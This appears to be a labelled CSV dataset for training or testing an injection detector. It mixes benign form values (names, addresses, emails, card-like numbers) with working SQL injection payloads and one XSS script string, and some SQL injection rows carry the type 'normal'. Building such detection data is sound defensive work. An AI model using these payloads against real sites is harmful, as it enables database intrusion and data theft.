Text,attack_type,Label,type
"1) as tkkn where 7832=7832 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
25175,norm,0,normal
ladi,norm,0,normal
moua,norm,0,normal
63ep6240e50o,norm,0,normal
janssen,norm,0,normal
1);begin dbms_lock.sleep(5); end,sqli,1,sql
1'||(select 'pcps' from dual where 7255=7255 and 7121=4603,sqli,1,sql
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs",sqli,1,sql
-6039%')) or 6872=6872 and (('%'=',sqli,1,normal
1157,norm,0,normal
05781002k,norm,0,normal
1'+(select echl where 6593=6593 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
melicent,norm,0,normal
l1am217r5,norm,0,normal
3786004753545909,norm,0,normal
ann-hoon,norm,0,normal
methi,norm,0,normal
"-3964"") where 3566=3566 order by 1--",sqli,1,sql
3013,norm,0,normal
3835247742889703,norm,0,normal
3582076186939679,norm,0,normal
quiliano,norm,0,normal
roch segui,norm,0,normal
84ambel,norm,0,normal
toolbox,norm,0,normal
5385467629611173,norm,0,normal
cantoria,norm,0,normal
sevilleja de la jara,norm,0,normal
debrocar,norm,0,normal
4501,norm,0,normal
8336141242852495,norm,0,normal
tes6a485n,norm,0,normal
marc@probandoo.kg,norm,0,normal
acheros sanchis,norm,0,normal
kingslan,norm,0,normal
lucian,norm,0,normal
molero bubnjar,norm,0,normal
3186627053603991,norm,0,normal
1789,norm,0,normal
"1'+(select cjcp where 2590=2590 union all select null,null,null,null,null,null,null#",sqli,1,sql
calle bendicion 160,norm,0,normal
dotras avi,norm,0,normal
1');select case when 8975=2352 then 1 else null end--,sqli,1,sql
15398407e,norm,0,normal
bansal,norm,0,normal
valdeganga,norm,0,normal
a7p9i9bl2,norm,0,normal
iberio,norm,0,normal
28359,norm,0,normal
"1)));iif(9190=5059,1,1/0)",sqli,1,sql
foody@cup-id.sd,norm,0,normal
-6449')) or 2590=2848,sqli,1,normal
kennie,norm,0,normal
9301738715220065,norm,0,normal
1')));select pg_sleep(5) and ((('qslr'='qslr,sqli,1,sql
1) where 7680=7680 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"-5910%'))) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",sqli,1,sql
marcanti,norm,0,normal
"1'+(select 'eoxk' where 6621=6621 union all select null,null#",sqli,1,sql
enz4riz7r,norm,0,normal
5154425798181531,norm,0,normal
27619,norm,0,normal
gros pal,norm,0,normal
ponsati puratic,norm,0,normal
"passeig gaudi 77, 3-e",norm,0,normal
"-3278')) or elt(1032=1032,3623) and (('zxig' like 'zxig",sqli,1,normal
romarico,norm,0,normal
15318,norm,0,normal
f5o9a8en9e,norm,0,normal
huffman@tobarisch.tt,norm,0,normal
broaddus@inversioneolica.eu,norm,0,normal
<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->,xss,2,xss
9366,norm,0,normal
7698,norm,0,normal
gungor,norm,0,normal
"1"")) as xcyo where 2929=2929;select sleep(5)--",sqli,1,sql
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'ccsb'='ccsb",sqli,1,sql
08968667r,norm,0,normal
novau pola,norm,0,normal
4431931876895268,norm,0,normal
45373661c,norm,0,normal
an de moncayo,norm,0,normal
"-1072%"")) or 3090=3539",sqli,1,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
montorns de segarra,norm,0,normal
maxsom,norm,0,normal
4661,norm,0,normal
2820,norm,0,normal
1246947052735749,norm,0,normal
"-7824""))) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",sqli,1,sql
rudolf,norm,0,normal
